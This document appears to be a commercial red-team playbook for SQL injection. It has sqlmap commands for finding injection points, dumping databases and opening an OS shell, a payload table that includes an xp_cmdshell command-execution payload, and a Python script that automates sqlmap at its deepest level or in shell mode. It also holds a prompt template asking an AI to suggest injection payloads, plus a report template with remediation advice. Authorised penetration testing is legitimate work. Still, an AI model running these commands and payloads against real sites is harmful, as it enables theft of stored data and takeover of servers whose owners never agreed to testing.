# 🔓 SQL Injection Attack Playbook

## Overview
Automated SQL injection detection, exploitation, and reporting playbook.

## Target Scope
- Login forms
- Search parameters
- API endpoints
- URL parameters
- HTTP headers

---

## Phase 1: Discovery

### Automated Discovery Commands

```bash
# 1. Identify injection points
sqlmap -u "http://target.com/login.php" --forms --crawl=1 --batch

# 2. Test all parameters
sqlmap -u "http://target.com/search?q=test" --all --batch

# 3. API endpoint testing
sqlmap -u "http://target.com/api/user/1" --method=GET --batch
```

### AI Prompt for Discovery
```
Analyze this URL for SQL injection vulnerabilities:
- URL: {target}
- Parameters: {params}
- Method: {method}

Identify:
1. Which parameters are potentially vulnerable
2. What database types to test
3. Suggested injection payloads
4. Risk level if exploitable
```

---

## Phase 2: Exploitation

### When Vulnerable - Escalate

```bash
# 1. Enumerate databases
sqlmap -u "{url}" --dbs --batch

# 2. Enumerate tables
sqlmap -u "{url}" -D {database} --tables --batch

# 3. Dump data
sqlmap -u "{url}" -D {database} -T {table} --dump --batch

# 4. Get shell (if OS-level access)
sqlmap -u "{url}" --os-shell --batch
```

### Custom Payloads

| Payload | Database | Use Case |
|---------|----------|----------|
| `' OR '1'='1` | All | Auth bypass |
| `' UNION SELECT NULL--` | All | Column enumeration |
| `'; WAITFOR DELAY '0:0:5'--` | MSSQL | Blind injection |
| `' AND SLEEP(5)--` | MySQL | Time-based blind |
| `'; EXEC xp_cmdshell('whoami')--` | MSSQL | RCE |

---

## Phase 3: Reporting

### Finding Template

```markdown
## SQL Injection - {parameter}

### Severity: CRITICAL

### Description
The parameter `{parameter}` at {URL} is vulnerable to SQL injection.

### Impact
- Complete database compromise
- Potential RCE via database features
- Data exfiltration risk
- Full application takeover

### Proof of Concept
```
{command_used}
{output}
```

### Remediation
1. Use parameterized queries (prepared statements)
2. Input validation + sanitization
3. WAF deployment
4. Least privilege database accounts
5. Regular security testing

### References
- OWASP A03:2021
- CWE-89
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
```

---

## Automation Script

```python
#!/usr/bin/env python3
"""
SQL Injection Automation Playbook
Usage: python sqli_playbook.py --url "http://target.com/page?id=1"
"""

import subprocess
import sys
import argparse

def run_sqlmap(url, action="scan"):
    """Run sqlmap with specified action."""
    base_cmd = ["sqlmap", "-u", url, "--batch", "--random-agent"]
    
    if action == "scan":
        cmd = base_cmd + ["--level=1", "--risk=1"]
    elif action == "deep":
        cmd = base_cmd + ["--level=5", "--risk=3"]
    elif action == "shell":
        cmd = base_cmd + ["--os-shell"]
    elif action == "dbs":
        cmd = base_cmd + ["--dbs"]
    else:
        cmd = base_cmd
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout, result.stderr

def main():
    parser = argparse.ArgumentParser(description="SQLi Playbook")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--action", default="scan", choices=["scan", "deep", "shell", "dbs"])
    args = parser.parse_args()
    
    print(f"[*] Running SQLi playbook on {args.url}")
    stdout, stderr = run_sqlmap(args.url, args.action)
    
    print(stdout)
    if stderr:
        print(f"[!] Errors: {stderr}")

if __name__ == "__main__":
    main()
```

---

## Deliverable Checklist

- [ ] Target scope defined and agreed
- [ ] Discovery scan completed
- [ ] Vulnerabilities identified
- [ ] Exploitation attempts (with PoC)
- [ ] Data exposure assessed
- [ ] Finding report generated
- [ ] Remediation recommendations provided
- [ ] Client debrief completed

---

## Pricing

| Service | Price |
|---------|-------|
| Basic Scan | $99 |
| Full Exploitation | $299 |
| Remediation Support | $199/hour |

---

*Part of SpecForge Red Team Services* 🔓
